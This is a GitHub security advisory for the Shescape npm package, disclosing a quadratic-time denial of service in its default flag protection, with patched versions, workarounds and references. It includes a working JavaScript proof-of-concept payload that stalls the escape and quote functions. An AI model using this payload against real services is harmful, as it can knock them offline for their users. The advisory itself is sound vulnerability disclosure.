# [H] Shescape: Quadratic-time denial of service in the flag-protection

## Summary
Severity: High
Advisory: GHSA-gm3r-q2wp-hw87
CVE: CVE-2026-73413
CWE: CWE-400, CWE-407
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-gm3r-q2wp-hw87
Type: github-advisory

## Affected
- npm: `shescape` — affected >=2.1.11 <2.1.14
- npm: `shescape` — affected >=3.0.0 <3.0.1

## Details
### Impact

This impacts users of Shescape that have flag protection enabled, which is on by default, regardless of the API being used.

An attacker can cause a runtime quadratic in the input size, causing denial of service for large inputs.

```javascript
import { Shescape } from "shescape";

// 1. Prerequisites
const options = {
    //flagProtection unspecified
    // Or
    flagProtection: true,
};

// 2. Payload
let payload = "\u0000-".repeat(32000);

// 3. Usage
const shescape = new Shescape(options);
let callback;

callback = () => shescape.escape(payload);
// Or
callback = () => shescape.escapeAll([payload]);
// Or
callback = () => shescape.quote(payload);
// Or
callback = () => shescape.quoteAll([payload]);

const t0 = process.hrtime.bigint();
callback();
const ms = Number(process.hrtime.bigint() - t0) / 1e6;

// 4. Impact
console.log("Duration:", ms);
// Outputs "Duration:" followed by a number close to 20000
```

### Patches

This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.

If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.

No patches will be released for version of Shescape lower than v2.0.0.

### Workarounds

Alternatively, users of Shescape can 1) put restrictions on the length of untrusted input or 2) strip all content before the **last** `-` from untrusted inputs.

### For more information

- Comment on Pull Request [#2651] for v2 and [#2649] for v3
- Comment on commit [b4b34c3] for v2 and [43d70b5] for v3
- Open an issue at <https://github.com/ericcornelissen/shescape/issues> (New issue > Question)

## References
- https://github.com/ericcornelissen/shescape/security/advisories/GHSA-gm3r-q2wp-hw87
- https://github.com/ericcornelissen/shescape/pull/2649
- https://github.com/ericcornelissen/shescape/pull/2651
- https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de
- https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f
- https://github.com/ericcornelissen/shescape
- https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md
- https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14
- https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1
